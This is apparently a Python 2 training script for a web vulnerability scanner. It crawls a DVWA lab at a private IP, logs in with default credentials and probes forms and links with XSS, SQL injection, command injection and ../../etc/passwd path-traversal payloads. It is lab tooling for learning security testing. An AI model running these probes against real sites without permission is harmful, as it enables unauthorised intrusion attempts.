#!/usr/bin/python2.7
import requests
import re
import urlparse
from BeautifulSoup import BeautifulSoup

class Scanner:
    def __init__(self, url, ignore_links):
        self.session = requests.Session()
        self.target_url = url
        self.target_links = []
        self.links_to_ignore = ignore_links

    def extract_links_from(self, url):
        response = self.session.get(url)
        return re.findall('(?:href=")(.*?)"', response.content)

    def crawl(self, url=None):
        if url is None:
            url = self.target_url
        href_links = self.extract_links_from(url)

        for link in href_links:
            link = urlparse.urljoin(url, link)

            if "#" in link:
                link = link.split("#")[0]

            if self.target_url in link and link not in self.target_links and link not in self.links_to_ignore:
                self.target_links.append(link)
                self.crawl(link)

    def extract_forms(self, url):
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content)
        return parsed_html.findAll("form")

    def submit_form(self, form, value, url):
        action = form.get("action")
        post_url = urlparse.urljoin(url, action)
        method = form.get("method")

        inputs_list = form.findAll("input")
        post_data = {}

        for input in inputs_list:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "text":
                input_value = value

            post_data[input_name] = input_value
        if method == "post":
            return self.session.post(post_url, data=post_data)
        return self.session.get(post_url, params=post_data)

    def run_scanner(self):
        for link in self.target_links:
            forms = self.extract_forms(link)
            for form in forms:
                print "[+] Testing form in " + link
                is_vulnerable_to_xss = self.test_xss_in_form(form, link)
                if is_vulnerable_to_xss:
                    print "--" * 50
                    print "[*****] XSS discovered in " + link + " in the following form:"
                    print form
                    print "--" * 50

                is_vulnerable_to_sql_injection = self.test_sql_injection_in_form(form, link)
                if is_vulnerable_to_sql_injection:
                    print "--" * 50
                    print "[*****] SQL Injection discovered in " + link + " in the following form:"
                    print form
                    print "--" * 50

                is_vulnerable_to_command_injection = self.test_command_injection_in_form(form, link)
                if is_vulnerable_to_command_injection:
                    print "--" * 50
                    print "[*****] Command Injection discovered in " + link + " in the following form:"
                    print form
                    print "--" * 50

                is_vulnerable_to_csrf = self.test_csrf_in_form(form, link)
                if is_vulnerable_to_csrf:
                    print "--" * 50
                    print "[*****] CSRF discovered in " + link + " in the following form:"
                    print form
                    print "--" * 50

            if "=" in link:
                print "[+] Testing " + link
                is_vulnerable_to_xss = self.test_xss_in_link(link)
                if is_vulnerable_to_xss:
                    print "--" * 50
                    print "[*****] XSS discovered in " + link
                    print link
                    print "--" * 50

                is_vulnerable_to_sql_injection = self.test_sql_injection_in_link(link)
                if is_vulnerable_to_sql_injection:
                    print "--" * 50
                    print "[*****] SQL Injection discovered in " + link
                    print link
                    print "--" * 50

                is_vulnerable_to_command_injection = self.test_command_injection_in_link(link)
                if is_vulnerable_to_command_injection:
                    print "--" * 50
                    print "[*****] Command Injection discovered in " + link
                    print link
                    print "--" * 50

                is_vulnerable_to_lfi = self.test_lfi_in_link(link)
                if is_vulnerable_to_lfi:
                    print "--" * 50
                    print "[*****] Local File Inclusion discovered in " + link
                    print link
                    print "--" * 50

    def test_xss_in_link(self, url):
        xss_test_script = "<sCript>alert('test')</scriPt>"
        url = url.replace("=", "=" + xss_test_script)
        response = self.session.get(url)
        return xss_test_script in response.content

    def test_xss_in_form(self, form, url):
        xss_test_script = "<sCript>alert('test')</scriPt>"
        response = self.submit_form(form, xss_test_script, url)
        return xss_test_script in response.content

    def test_sql_injection_in_link(self, url):
        sql_test_script = "' OR '1'='1"
        url = url.replace("=", "=" + sql_test_script)
        response = self.session.get(url)
        return "You have an error in your SQL syntax;" in response.content

    def test_sql_injection_in_form(self, form, url):
        sql_test_script = "' OR '1'='1"
        response = self.submit_form(form, sql_test_script, url)
        return "You have an error in your SQL syntax;" in response.content

    def test_command_injection_in_link(self, url):
        command_test_script = "& echo test"
        url = url.replace("=", "=" + command_test_script)
        response = self.session.get(url)
        return "test" in response.content

    def test_command_injection_in_form(self, form, url):
        command_test_script = "& echo test"
        response = self.submit_form(form, command_test_script, url)
        return "test" in response.content

    def test_csrf_in_form(self, form, url):
        # Check if CSRF token is present in the form
        inputs = form.findAll("input")
        for input in inputs:
            if input.get("name").lower() == "csrf_token":
                return False
        return True

    def test_lfi_in_link(self, url):
        lfi_test_script = "../../etc/passwd"
        url = url.replace("=", "=" + lfi_test_script)
        response = self.session.get(url)
        return "root:" in response.content

target_url = "http://192.168.44.101/dvwa/"
links_to_ignore = ["http://192.168.44.101/dvwa/logout.php"]
vuln_scanner = Scanner(target_url, links_to_ignore)

data_dict = {"username": "admin", "password": "password", "Login": "submit"}
vuln_scanner.session.post("http://192.168.44.101/dvwa/login.php", data=data_dict)

vuln_scanner.crawl()
vuln_scanner.run_scanner()
